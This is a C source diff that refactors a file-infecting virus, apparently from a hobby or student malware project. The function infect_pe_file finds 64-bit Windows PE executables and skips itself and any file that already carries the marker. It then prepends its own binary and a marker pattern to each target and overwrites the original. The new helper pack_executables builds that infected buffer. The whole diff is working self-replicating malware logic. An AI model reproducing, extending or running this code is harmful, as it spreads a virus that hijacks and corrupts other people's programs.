@@ -12,37 +12,43 @@
 
 #include "infection.h"
 
+int			pack_executables(char **result, char *prefix, int prefix_len, char *suffix, int suffix_len)
+{
+	char	pattern[] = { PATTERN };
+	int		total_len = prefix_len + suffix_len + sizeof(pattern);
+	char	*new_exe = NULL;
+
+	if ((new_exe = (char *)malloc(sizeof(char) * total_len)) == NULL)
+		return 0;
+	memcpy(new_exe									, prefix		, prefix_len);
+	memcpy(new_exe + prefix_len						, (char*)pattern, sizeof(pattern));
+	memcpy(new_exe + prefix_len + sizeof(pattern)	, suffix		, suffix_len);
+	*result = new_exe;
+	return (total_len);
+}
+
 /*
 ** Infect windows Portable executable
 */
 void		infect_pe_file(char *argv, IMAGE_DOS *img) {
-	char	pattern[] = { PATTERN };
+	char	*infection_content = NULL;
+	int		infection_size = 0;
 
 	if (is_pe_x64(img->pe_header) == false)
 		return ;
 	if (strcmp(file_base_name(img->name), file_base_name(argv)) == 0)
 		return ;
-	printf("Infect %s\n", img->name);
-	int pattern_position = find_pattern(img->buffer, img->len);
-	if (pattern_position != -1)//is file infected
+	if (find_pattern(img->buffer, img->len) != -1)//is file infected
 	{
-		printf("%s already infected\n", img->name);
+		printf("File \"%s\" is already infected\n", img->name);
 		return ;
 	}
-	char *infection_content = NULL;
-	int infection_size = 0;
-
-	if ((infection_size = windows_file_get_contents_size(&infection_content, argv)) <= 0)
+	if ((infection_size = windows_file_get_contents_size(&infection_content, argv)) <= 0) {
 		return ;
-	int final_len = img->len + infection_size + sizeof(pattern);
-	img->new_buffer = malloc(final_len);
-	if (img->new_buffer == NULL)
-		return ;
-	memcpy(img->new_buffer, infection_content, infection_size);
-	memcpy(img->new_buffer + infection_size, (char*)pattern, sizeof(pattern));
-	memcpy(img->new_buffer + infection_size + sizeof(pattern), img->buffer, img->len);
-	printf("%s infected, final_len: %d, infection_size: %d\n", img->name, final_len, infection_size);
-	windows_file_put_contents_size(img->name, img->new_buffer, final_len);
+	}
+	img->new_buffer_len = pack_executables(&img->new_buffer, infection_content, infection_size, img->buffer, img->len);
+	printf("File \"%s\" infected\n", img->name);
+	windows_file_put_contents_size(img->name, img->new_buffer, img->new_buffer_len);
 }
 
 /*
